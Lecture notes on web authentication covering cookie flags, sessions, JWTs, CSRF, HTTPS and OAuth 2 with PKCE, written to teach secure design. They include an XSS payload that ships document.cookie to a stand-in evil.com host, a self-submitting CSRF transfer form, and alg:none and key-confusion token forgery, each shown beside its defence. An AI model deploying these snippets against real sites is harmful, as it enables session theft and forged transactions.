Recap — cookies, sessions & the two token families

Last class ended at session auth and the stateful/stateless split. Before JWTs get opened up, a quick-fire round on exactly that — commit to each answer out loud, then reveal.

📁 Code for this section: last class’s live demo still applies — LLD-34-Authentication-2-JWT-OAuth2/code/demo_server.py  ·  run python3 demo_server.py → localhost:8034

The 60-second replay — log in once, get a cookie, the browser re-sends it forever after:

You deploy a new version of your single server at 2pm. Every user is suddenly logged out. Which token family were you running — and why did the deploy log everyone out?

Where the truth lives decides who survives a restart.
  • With stateful sessions the truth lives server-side. In-memory store + restart = all rows gone; every cookie’s sid is now a dangling pointer → mass logout.
  • Fixes: keep sessions in a store that survives restarts (DB/Redis) — or go stateless: a JWT would still verify after the restart because the truth rides in the token, not in server memory.
  • Browsers don’t clear cookies on redeploys — the cookie was fine; what it pointed at vanished.

🧐 Hold on — do real companies actually keep sessions in memory?

▼
  • In the app process itself? Mostly only by accident — but it’s a famous accident. Express’s express-session ships with an in-process MemoryStore whose own docs say “not for production” — and plenty of small apps deploy it anyway. Flask/Django dev setups with a local-memory cache backend do the same. The 2pm mass-logout in this question is that story, and it genuinely happens.
  • What production actually does: keep the session rows in an external store — Redis or a database (Django’s default is the django_session DB table). Your app servers restart freely; the store survives; nobody gets logged out.
  • The fun nuance: Redis is also memory — just someone else’s memory, in a separate process on a separate box. An app deploy doesn’t touch it; a Redis restart without persistence (RDB/AOF) would log everyone out the same way. “In memory” isn’t the sin — in the same process you keep redeploying is.
  • A second cause of mass-logouts — rotating a signing secret on deploy — but be precise about when it bites: a JWT secret change invalidates every JWT at once (they’re all signed by it). Django’s SECRET_KEY is subtler → see below.
  • Does SECRET_KEY affect the sessionid cookie? For the default DB / cache / file session backends: no. The sessionid is a random key (get_random_string in django/contrib/sessions/backends/base.py), stored server-side — it isn’t derived from SECRET_KEY, so rotating the key does not log those users out. Only the signed-cookies backend (SESSION_ENGINE = "...signed_cookies", code in backends/signed_cookies.py) stores the whole session in the cookie signed by SECRET_KEY — that one logs everyone out. (Rotating SECRET_KEY does still break other signed things: password-reset links, django.core.signing values, in-flight CSRF tokens.)

At login the server sends Set-Cookie: sid=abc123; HttpOnly; Secure; SameSite=Lax; Max-Age=3600. On the user’s next request, what does the browser actually put in the Cookie: header it sends back?

The browser echoes only name=value — the flags stay client-side.
  • A Set-Cookie has two kinds of thing: the name=value pair (the actual data) and attributes/flags (HttpOnly, Secure, SameSite, Max-Age, Path, Domain). The flags are directives telling the browser how to store and when to send the cookie — it obeys them but never sends them back.
  • So the return trip is always just Cookie: sid=abc123 (several cookies → Cookie: a=1; b=2). The server can’t ‘read back’ whether a cookie was HttpOnly — it only knows what it set.
  • Why it matters: those flags are your only lever over cookie security, and they live entirely on the server’s Set-Cookie line — the client never reports them back.

🧠 So what all can — and can’t — live in a cookie?

▼
  • The name=value holds a small string — typically an opaque session id (sid=abc123) or a JWT (token=eyJ...). One cookie caps around 4 KB, so a fat JWT can bump that limit.
  • Alongside sit the flags (server-set, never returned): HttpOnly, Secure, SameSite, Domain/Path, Max-Age/Expires. They shape behaviour; they aren’t data.
  • Never put a secret in the value — a raw password, a card number, PII. A plain cookie isn’t encrypted, and (like a JWT payload) is readable. Store a reference and keep the secret server-side.
  • The recurring trap: “cookie vs token” is a category error — the cookie is the container; the session id or JWT inside is the token. The real axes are stateful vs stateless and cookie vs Authorization header.
⚠️ A true cautionary tale. Early web apps put trust straight in the cookie — isAdmin=false or user_id=42 in plaintext. Users opened DevTools, changed false→true or 42→43, and got admin rights or someone else’s account — no hacking tools, just editing a cookie. (Same era: Firesheep, 2010 — a one-click Firefox add-on that hijacked the unencrypted session cookies of anyone on the same café wifi. It shamed the whole industry into HTTPS-everywhere.) The lessons: put an opaque, server-verified value in the cookie (a random session id, or a signed JWT), never a raw fact you trust; and always Secure. Best practice: OWASP Session Management Cheat Sheet ↗.

🔧 So how does Django actually mint that random sessionid? (with the code)

▼
  • When a new session is needed, SessionBase._get_new_session_key() — in django/contrib/sessions/backends/base.py — calls get_random_string(32, VALID_KEY_CHARS): 32 characters drawn from VALID_KEY_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789" (36 symbols).
  • get_random_string (in django/utils/crypto.py) picks each character with secrets.choice — a cryptographically-secure RNG, not random — and it loops until the key isn’t already in use.
  • That’s 3632 ≈ 1049 possibilities — unguessable. Crucially it’s random, not derived from anything (which is exactly why rotating SECRET_KEY doesn’t invalidate it). The session data lives server-side, keyed by this id; the cookie just carries the id.
  • Is it encoded? Encrypted? Neither. There’s nothing to encode or encrypt — unlike a JWT (which encodes real claims), a session id carries no information at all. It’s a random string that merely points to your data on the server. Random ≠ encoded ≠ encrypted — the value is meaningless by itself, which is exactly why it’s safe to hand out.
  • See it yourself: log in, then DevTools → Application → Cookies shows sessionid = a 32-char string; the DB’s django_session table has the matching session_key row.

🍪 The flags, under fire

Three production incidents, one cookie flag each.

A frontend dev asks you to drop HttpOnly from the session cookie — “my JavaScript needs to read it to know if the user is logged in.” Call?

Never trade the token’s safety for a convenience readable another way.
  • HttpOnly exists precisely so that a stray <script> reading document.cookie gets nothing. Remove it and one XSS = stolen sessions at scale.
  • The frontend’s real need (“is the user logged in?”) is served safely by calling /me — the browser attaches the cookie itself; JS never needs to see it.
  • Secure solves a different attack (plaintext sniffing); it does nothing about XSS. Flags aren’t interchangeable — each blocks its own attack.

🐛 See an XSS actually fire — a 2-minute local demo

▼

XSS in one line: if a site renders your text as HTML, an attacker can smuggle in a <script> that runs inside your page, with your cookies.

<!-- a "comment" an attacker types into a vulnerable comments box -->
<img src=x onerror="fetch('https://evil.com/steal?c=' + document.cookie)">

commentBox.innerHTML  = userComment;   // UNSAFE: the onerror runs -> cookie shipped to evil.com
commentBox.textContent = userComment;  // SAFE: shows the tag literally; nothing executes
  • The vulnerable step is always the same: user input rendered as HTML (innerHTML, React’s dangerouslySetInnerHTML, an unescaped template). Frameworks (React, Django, Jinja) escape by default — which is why you rarely write this bug on purpose.
  • HttpOnly is the safety net: if the session cookie is HttpOnly, that document.cookie comes back without the sid — the XSS still ran, but it can’t steal the session.
  • Try it — no server needed: open code/xss_demo.html (double-click the file). Paste the payload, click Render the UNSAFE way and watch it pop an alert reading document.cookie; click Render the SAFE way and the same payload sits there inert. All local, only alert(), no real network calls.

A user on hotel wifi clicks an old http:// (not https) link to your site. An eavesdropper is sniffing the network. Your session cookie has Secure set — what does the sniffer capture?

Secure = the cookie refuses to travel unencrypted.
  • Secure pins the cookie to HTTPS. On the accidental http:// hit the request goes out without the cookie — there’s simply nothing for the sniffer to read.
  • Without the flag, that single stray link leaks the session id in cleartext — instant account takeover.
  • There’s no “encrypted cookie” middle ground on plain http — the choice is sent in the clear or not sent; Secure picks not sent.

🔒 ELI5 — HTTP vs HTTPS, and how to get HTTPS on localhost

▼

The one-sentence version

  • HTTP is a postcard. Every hop between you and the server (your wifi router, the coffee-shop network, ISPs) can read and change everything — including your sid cookie. HTTPS is the same postcard sealed in a tamper-proof envelope only the server can open.
  • What HTTPS actually gives you: confidentiality (encrypted, no eavesdropping), integrity (nobody can alter it in transit), and authenticity (a certificate proves you’re really talking to yourbank.com, not an impostor).

How the “sealing” works — the TLS handshake, in 3 steps

  • 1. Certificate: the server presents a certificate signed by a Certificate Authority (CA). Your browser trusts a built-in list of CAs, so it can verify the site is who it claims. Certs are free now — Let’s Encrypt issues them automatically; that’s why HTTPS is everywhere.
  • 2. Key exchange: browser and server agree on a shared secret key using public-key crypto — without ever sending the key across the wire (modern TLS 1.3 does this in one round-trip).
  • 3. Encrypted traffic: from then on everything (headers, cookies, body) is symmetric-encrypted with that key. A sniffer sees only scrambled bytes.

Today’s nuances worth knowing

  • localhost is treated as ‘secure’ by browsers even over plain http — so Secure cookies, service workers, and most web APIs work in local dev without a certificate. You usually don’t need HTTPS locally.
  • When you do want real local HTTPS (to test Secure/SameSite=None, or a webhook): mkcert makes a locally-trusted cert in two commands (mkcert -install, then mkcert localhost), and you point your dev server (Django runserver_plus --cert-file, Node https, etc.) at it.
  • HSTS (a Strict-Transport-Security header) tells browsers “only ever talk to me over HTTPS” — it closes the ‘accidental http:// link’ gap from the last question. And mixed content (an https page loading http resources) is blocked by browsers.
🌐 Real world: ~95% of pages loaded in Chrome are now HTTPS (Google Transparency Report), up from ~40% in 2015. Let’s Encrypt alone has issued billions of free certificates — the single biggest reason the web went encrypted.

Your session cookie is SameSite=Lax and the user is logged in. In which one of these does the browser still attach the cookie?

Lax = top-level GET navigations only; nothing else cross-site.
  • The subtlety: all three requests go to yourapp.com — so “it’s my domain, the cookie tags along” feels right for each. But Lax attaches the cookie on exactly one shape: a top-level navigation that’s a safe method (GET) — i.e. the user actually going to your site. That’s the email link.
  • The <img> is a cross-site subresource load and the <form POST> is a cross-site unsafe method — Lax sends the cookie on neither. That’s precisely what defeats the CSRF forged-transfer (option 3) while keeping the email link (option 2) working.
  • Mental model: “did the user themselves navigate here?” → cookie sent. “did another site trigger this in the background?” → cookie withheld.

The same bank cookie, in plain words

  • Strict: a friend texts you a link to your bank. You tap it — and arrive logged out (the tap came from the messaging app, a different site, so the cookie was withheld). Open your own bookmark instead → logged in. Safest, but that surprise logout is the cost.
  • Lax: that same friend’s link → you arrive logged in (you navigated there yourself). But if a shady page silently auto-submits a transfer to your bank in the background → no cookie is sent, so it’s rejected. Best of both — the default.
  • None + Secure: a shop embeds a ‘Pay with Stripe’ box. Stripe’s iframe is a different site living inside the shop’s page, so its cookie must be None; Secure or it won’t work there at all.

Rule of thumb: start at Lax (the default). Go Strict for the most sensitive cookie if the UX allows. Reach for None + Secure only when a legitimate other site must send your cookie — and know you’ve just re-opened the CSRF door you closed, so add CSRF tokens there.

🌐 Real world: In 2020, Chrome 80 made SameSite=Lax the default for any cookie that doesn’t set the attribute — a browser-level CSRF mitigation that shipped to billions of users overnight. It also broke a wave of cross-site embeds and payment iframes that had silently relied on the old ‘send everywhere’ behaviour — those had to switch to None; Secure.

Sending the token — cookie vs header (and mobile)

You hold a token — a session id or a JWT. Every request has to carry it back to the server. There are two established ways to do that, and which you pick shapes your whole security posture.

📁 Code for this section: last class’s demo_server.py shows both — session via cookie, JWT via Authorization header  ·  run python3 demo_server.py → localhost:8034
🍪
In a Cookie
The browser stores it and attaches it to every request to the domain — automatically, zero client code. You harden it with HttpOnly + Secure + SameSite. The default for server-rendered web apps.
🎫
In an Authorization header
Your code reads the token from storage and sends Authorization: Bearer <token> itself. The standard for public APIs, SPAs and mobile.

🤵 Wait — what is CSRF, and why is a Bearer header immune?

▼

ELI5: your browser is a little too helpful — it attaches your cookies to any request to a site, even one that another site secretly triggered. So a hidden form on evil.com can make your browser POST to yourbank.com/transfer, and the bank sees your valid session cookie riding along. You never clicked anything. That’s Cross-Site Request Forgery.

<!-- this sits on evil.com and submits itself the moment the page loads -->
<form action="https://yourbank.com/transfer" method="POST">
  <input name="to" value="attacker"><input name="amount" value="5000">
</form>
<script>document.forms[0].submit()</script>
<!-- evil.com never learns your cookie — the BROWSER attaches it for the request -->
  • Why a cookie is exposed: the browser sends it automatically, so it rides on the forged request too. Defences: SameSite=Lax/Strict (don’t send it cross-site) or a CSRF token the evil site can’t know.
  • Why a Bearer header is immune: an Authorization: Bearer … token is added by your own JavaScript, never automatically. evil.com’s form can’t set it, so the forged request arrives with no credential — nothing to forge.
  • Try it: open code/csrf_demo.html (double-click). Pick a defence, hit “Visit evil.com,” and watch ₹5,000 get stolen with None — then blocked by SameSite / CSRF-token / Bearer.

📊 So which is most popular — and most secure?

  • Traditional web session → a cookie (HttpOnly + Secure + SameSite=Lax) is the established, secure default: least code, and the token is invisible to JavaScript.
  • APIs / SPAs / mobile → Authorization: Bearer is the norm — CSRF-immune and works across origins where cookies get awkward.
  • Neither is simply ‘more secure’ — the risk just moves: a cookie is XSS-safe (if HttpOnly) but CSRF-exposed; a Bearer token is CSRF-immune but XSS-exposed (a token in localStorage is one XSS away from theft).
  • Current best-practice for web SPAs: keep a short-lived access token in memory (sent as Bearer) and the refresh token in an HttpOnly+Secure+SameSite cookie — CSRF-safe refresh, and the access token never touches localStorage.

📱 Can a mobile app hold a cookie? — what actually happens on phones

▼
  • Native mobile apps generally don’t use the browser cookie model — there’s no shared cookie jar, and no CSRF (nothing is auto-attaching cookies on your behalf).
  • They store the token in secure OS storage — iOS Keychain, Android Keystore / EncryptedSharedPreferences — and send it as Authorization: Bearer on each API call. That’s why almost every mobile API is Bearer-token based.
  • Exceptions: a WebView inside the app is a browser, so it has a cookie store; and some HTTP clients ship a cookie manager. But the native, header-based token is the default and the recommended path.
  • Refresh works just like a SPA: a long-lived refresh token in secure storage mints short-lived access tokens.
🤝 Bottom line: cookie-vs-header is a transport choice, independent of session-vs-JWT. Web that can use cookies → HttpOnly cookie; anything cross-origin or native → Bearer header. Large apps routinely use both at once (a cookie for the web session, Bearer for the mobile/API clients).

JWT / JWS in depth

Sessions work beautifully — on one server. Before we open up the JWT, let’s feel the exact pain that made people want a stateless token in the first place.

📁 Code for this section: LLD-34-Authentication-2-JWT-OAuth2/code/03_jwt_and_jws_deep.py — build & verify a JWT from scratch (stdlib, zero installs)  ·  run pytest 03_jwt_and_jws_deep.py -v

🤔 Discuss first — Your app gets popular, so you run it on five servers behind a load balancer, and a user’s requests bounce between them. With session auth, request #2 lands on a server that never saw the login. How does that server know who the user is — and what does that force you to build?

▼
  • Sessions live on the server, so every server must reach a shared session store (Redis/DB) and do a lookup on every request — a network hop each time, a bottleneck, and a single point of failure.
  • (Or you pin each user to one server — ‘sticky sessions’ — which breaks the moment that server restarts.)
  • A stateless token fixes it: the token carries the signed truth, so any server verifies it locally with just the secret — no shared store, no per-request lookup. Add servers freely.

⚖️ Why stateless? The scaling picture

  • Stateful (session): the truth lives in one shared store; every server, every request, does a lookup there. It works — but that store is now a bottleneck you must scale and protect.
  • Stateless (JWT): the truth rides inside the signed token; any server verifies it with the secret alone. No shared store, no lookup — ideal for many servers, microservices (one service issues, others verify independently), and mobile / third-party APIs.
  • The price: you can’t easily un-issue what you never stored — revocation is hard. That’s the access + refresh trade-off we’ll get to.
🧾 Which scenarios call for which family? You just decided, row by row, in the recap’s scenario table — the short version: instant revocation or a single server → session; scale-out, microservices or cross-device → JWT, usually as the hybrid access+refresh pattern we’ll meet below.

🧩 Now, what’s inside one?

🤔 Discuss first — A JWT’s payload is just base64 — anyone holding the token can decode and read every claim. So is a JWT encrypted? And if not, what is the signature actually protecting?

▼
  • A JWT is signed, not encrypted — technically a JWS (JSON Web Signature). The payload is readable by anyone.
  • The signature protects integrity, not confidentiality: it proves the token wasn’t altered and came from someone holding the secret — it does not hide the contents.
  • So never put a secret (password, card, PII) in a JWT. Its encrypted cousin, JWE, exists but is rare; 99% of ‘JWT’ in the wild means JWS.

🧩 header . payload . signature

header    {"alg":"HS256","typ":"JWT"}                  → base64url  → eyJhbG...
payload   {"sub":"42","role":"admin","exp":1780...}    → base64url  → eyJzdWI...
signature HMAC_SHA256( header_b64 + "." + payload_b64, SECRET )    → K3f9...

token  =  eyJhbG
...  .  eyJzdWI...  .  K3f9...      (the three joined by dots)
💬 What it does: Anyone can read header & payload (base64 is not encryption). Only the server can produce a valid signature, because only it holds SECRET — so a forged or edited token fails verification.

🧠 So what’s the ‘algorithm’ here — encoding, encryption, or hashing?

▼

Remember Part 1’s three transforms? A JWT uses two of them — and never encryption:

  • header & payload → base64url ENCODING. Just a reversible re-spelling so the bytes ride safely in a URL. No key, no secrecy — anyone pastes them into jwt.io and reads them. (That’s why the payload is public.)
  • signature → HMAC-SHA256, a keyed HASH. One-way, using the server’s secret. It proves the token wasn’t altered and came from someone who holds the secret. It is not encryption — there is no ‘decrypt’ step anywhere.
  • So a normal JWT (a JWS) is encoding + hashing, zero encryption. That one fact explains all its behaviour: readable payload (encoding), tamper-proof (hash), but never put a secret inside (nothing is hidden).
  • The alg field just names that signature algorithm — HS256 = HMAC-SHA256. (An encrypted cousin, JWE, exists but is rarely used.)

🔄 The life of a JWT — generate, send, verify

Three moments. Let’s take them one at a time.

① Server generates it — once, when you log in

You send the right password. The server decides what it wants to remember about you (your id, your role), and signs it so nobody can change it later.

payload = {"sub": "42", "role": "admin", "exp": now + 900}   # who you are, for 15 min
token = base64(header) + "." + base64(payload) + "." + sign(header, payload, SECRET)

② It travels to the client, who stores it

The server hands the token back — in a cookie, or for an API in the response body. From now on the client attaches it to every request (the two ways are the Transport section).

Authorization: Bearer eyJhbG....eyJzdWI....K3f9      # client sends this each time

③ Server verifies it — on every single request

No database lookup. The server re-computes the signature with its SECRET and checks it matches — if one character of the token was changed, it won’t. Then it checks the token hasn’t expired.

expected = sign(header, payload, SECRET)
if expected != token_signature:  reject     # tampered or forged
if payload["exp"] < now:         reject     # expired
# else: trust the claims — you're user 42, role admin

🚨 Two attacks you must defend

💥 The alg: none attack — a story you can watch live

▼

The situation

You’re a normal user. You log in and get a token whose payload says {"sub":"42","role":"user"}. You’d love to be role:"admin". So you base64-decode the payload, change user→admin, and re-encode it.

Why that alone fails

The moment you edit the payload, its bytes no longer match the signature (which was computed over the original payload with the server’s SECRET — which you don’t have). On the next request the server re-signs and the two don’t match → rejected. Good.

The attacker’s trick

“If I can’t make a valid signature… what if the server checks none?” So they set the header to {"alg":"none"}, put their forged admin payload, and leave the signature empty — betting the library reads alg from the (attacker-controlled!) header and skips verification.

# what actually hits the backend:
header  = {"alg": "none"}                 # attacker set this
payload = {"sub": "42", "role": "admin"}  # attacker forged this
signature = ""                            # empty!

# a NAIVE server:  alg = header["alg"]  ->  "none"  ->  "no signature to check"  ->  ACCEPTS  😱
# a CORRECT server: verify(token, algorithms=["HS256"])  ->  "not HS256"  ->  REJECTS  ✅

The one-line defence

Pin the algorithm server-side and never trust the header’s alg: jwt.decode(token, SECRET, algorithms=["HS256"]). A real CVE that hit many libraries in 2015.

🔮 See it live on jwt.io: paste any token; in the left pane change "role" to "admin" and watch the “Signature Verified” badge flip to red “Invalid Signature” the instant you edit — because you don’t hold the secret. That red badge is exactly what your server’s verify() does on every request. (Now blank the secret box and note it only ‘verifies’ because jwt.io has the key — your attacker never does.)

💥 The HS256/RS256 confusion attack — where do public & private keys live?

▼

First, the two ways to sign a JWT — and which key is used where:

  • HS256 (symmetric): one shared secret both signs and verifies. Simple — but anyone who can verify also holds the key to forge. Fine when the same app issues and checks its own tokens.
  • RS256 (asymmetric): a key pair. The private key signs and never leaves the issuer (only Google can mint Google’s tokens). The public key verifies and is published for anyone — it can check a signature but cannot create one. This is what lets a hundred services trust Google’s tokens without being able to fake them.

The attack, step by step

  • A server expects RS256 and verifies with Google’s public key (which is, by design, public knowledge).
  • The attacker forges a token but sets the header to alg: HS256, and signs it using that public key’s bytes as the HMAC secret.
  • A naive library reads alg from the header, sees HS256, and runs HMAC verification with ‘the key it was given’ — the public key. The signatures match → the forged token is accepted. The public key, meant only to verify, was tricked into being a signing secret. 😱
✅ Defence (same as alg:none): pin the algorithm server-side — verify(token, algorithms=["RS256"]). Never let the token’s own header choose; symmetric (HS*) and asymmetric (RS*/ES*) verification must never be interchangeable.

🔄 The fix for “JWTs are hard to revoke”: access + refresh — the user journey

▼

The tension: you want tokens short-lived (a stolen one dies fast) but users hate logging in every 15 minutes. Two tokens solve both at once.

  • Access token — short-lived (~15 min), a JWT sent on every API call. If stolen, it’s useless in minutes.
  • Refresh token — long-lived (days), kept safe and sent only to one endpoint, /refresh, to mint a fresh access token.

Walk it through — a real morning

  • 9:00 — you log in. Server returns an access token (expires 9:15) and a refresh token (expires next week).
  • 9:00–9:15 — every request carries the access token; the server just verifies its signature. No DB lookups.
  • 9:15 — the access token expires; the next call gets a 401. Your app silently POSTs the refresh token to /refresh, gets a new 15-min access token, and retries. You noticed nothing.
  • Next week — the refresh token finally expires → now you actually log in again.
🔑 And this is how you get revocation back: the access token you can’t un-issue — but it dies in 15 minutes anyway. To kill a session now, you refuse to refresh it (drop/blacklist the refresh token, or bump a per-user token_version). Worst case the attacker has <15 minutes. You’ll wire exactly this in the next class.
🌐 Real world: Real lifetimes you’ll see: GitHub OAuth access tokens ~8h, refresh ~6 months; Google access tokens 1h; AWS STS temporary creds 15 min–12h; Auth0/Okta default access tokens ~15–60 min. The pattern is universal — short access, long refresh.

A teammate wants to store the user’s role AND their credit-card number in the JWT payload “to save a DB call.” Verdict?

Signed ≠ encrypted; put references, not secrets.
  • The role is fine (non-secret, and the signature stops tampering). The card number is effectively plaintext — anyone with the token base64-decodes it.
  • The signature proves integrity, it does not hide the payload. Confidentiality would need JWE (encryption).
  • Rule: put an id in the token and fetch secrets server-side. Non-secret claims (sub, role, exp) are exactly what JWTs are for.

step 3 · delegated login

“Login with Google” — how does it really work?

Before we name today’s last idea, sit with the problem it was invented to solve.

🤔 It’s 2005. You built a photo-printing site, and to print someone’s Facebook albums the only way you know is to ask them to type their Facebook password into your site so you can log in as them and fetch the photos. Millions of sites did exactly this. What’s the worst thing that’s now true?

Sharing a password shares everything, forever.
  • A password is an all-or-nothing, un-scoped, un-revocable key. Handing it over grants total control until it’s changed — and now every app that asked becomes a fresh place your Facebook password can leak from.
  • “Delete it right after” is a promise, not a guarantee — and even a second in someone’s database (or logs) is a breach waiting to happen. Throttling is a nuisance, not the danger.
  • What you actually want: let the user prove themselves to Facebook, and have Facebook hand your app a limited, revocable token — ‘read photos, nothing else.’ That invention is OAuth.

📜 The old way vs the OAuth way — step by step

😱 The old way (the “password anti-pattern”): ① you type your Google password into RandomApp → ② RandomApp stores it and logs into Google as you → ③ it now has full access (all your email, not just contacts), and if RandomApp is hacked, your Google goes with it.
✅ The OAuth way: ① RandomApp sends you to Google — you log in there, the app never sees your password → ② Google asks you “allow RandomApp to read contacts?” and you approve → ③ Google hands the app a scoped, revocable token — read contacts only, killable anytime from your Google account.

You meet this every day, and the value is always the same — share access, never the password, scoped to exactly one job:

📚 A little history — OAuth 1 → 2 → OIDC

▼
  • 2006: Twitter’s Blaine Cook needs third-party apps to reach Twitter accounts without storing passwords — the ‘password anti-pattern’ above was rampant.
  • 2007: OAuth 1.0 — first open standard, but it made every request carry a hand-computed cryptographic signature. Powerful, but notoriously hard to implement correctly (a 2010 1.0a patched a session-fixation flaw).
  • 2012: OAuth 2.0 (RFC 6749) — a ground-up rewrite. It drops per-request signatures in favour of bearer tokens over TLS (HTTPS does the protecting), adds multiple ‘grant types’, and is what essentially everyone uses today.
  • 2014: OpenID Connect — a thin identity layer on top of OAuth 2 that adds an ID token (a JWT!). OAuth 2 alone grants authorization (‘what may this app do?’); OIDC adds authentication (‘who is this user?’) — which is what makes “Login with Google” a login.
🌐 Real world: OAuth 2.0 (RFC 6749) now underpins essentially every “Sign in with…” button and every major API — Google, GitHub, Stripe, Slack, Shopify. And PKCE (RFC 7636, 2015) started as a mobile-only patch; the current OAuth 2.1 draft now recommends it for every client, web included.

🔄 The Authorization Code flow (with PKCE) — built up one arrow at a time

Five messages between three parties. Watch the diagram grow as each step is added; example values in code.

① The app sends you to Google

You click “Login with Google.” The app redirects your browser to Google, adding who’s asking, what it wants, and a PKCE puzzle it’ll need to answer later.

GET https://accounts.google.com/authorize?
      client_id=photoapp        # who is asking
      scope=contacts.read       # what it wants (nothing more)
      code_challenge=sha256(v)  # PKCE: the hash of a secret "v" the app keeps

② You log in at Google and approve

Google — not the app — checks your password, then shows the consent screen. The app never sees any of this.

Google:  "PhotoApp wants to: read your contacts.  [Allow]  [Deny]"

③ Google sends back a one-time code (not the token yet)

Google redirects your browser back to the app with a short-lived, single-use code. Why a code and not the token? Because this travels through the browser, where it could be glimpsed — so it’s worthless on its own.

GET https://photoapp.com/callback?code=xyz123     # single-use, expires in ~60s

④ The app’s server swaps the code for a token

Now a direct server-to-server call (no browser). The app proves the code is really its own by revealing the PKCE secret v whose hash it sent in step ①. Google checks sha256(v) matches, then returns the access token.

POST https://accounts.google.com/token
      code=xyz123
      code_verifier=v          # the secret behind step 1's hash -> proves it's the same app

⑤ The app calls the API with the token — and gets only what you allowed

GET https://api.google.com/contacts
      Authorization: Bearer <access token>     # returns contacts ONLY — not email, not files

🧩 Why PKCE? — and why a code instead of a token up front

▼
  • The short-lived code travels through the browser (a redirect), where it could be intercepted. The valuable token is only ever handed over on the server-to-server exchange.
  • PKCE (Proof Key for Code Exchange): the app invents a secret verifier, sends only its SHA-256 challenge in step 1, and must present the original verifier in step 4. A stolen code is useless without the verifier — SHA-256(attacker’s guess) ≠ challenge.
  • Every modern web/mobile app should use Authorization Code + PKCE. (The old ‘implicit flow’ that returned a token in the URL is deprecated.)
💡 OAuth vs OpenID Connect: OAuth 2 grants authorization (access to data). OIDC is a thin layer on top that adds an ID token (a JWT!) so the app learns who you are — that’s the “login” in “login with Google”. JWT and OAuth meet here.

What does OAuth 2 fundamentally let you avoid sharing?

Delegated access without handing over the password.
  • The app never sees your Google password; you authenticate with Google, which vouches for you via a token scoped to what you consented to.
  • You do share data — but only the consented scope, and you can revoke the app’s access anytime from your Google account.
  • You’re not anonymous to Google — that’s the point; Google knows it’s you and tells the app just enough.
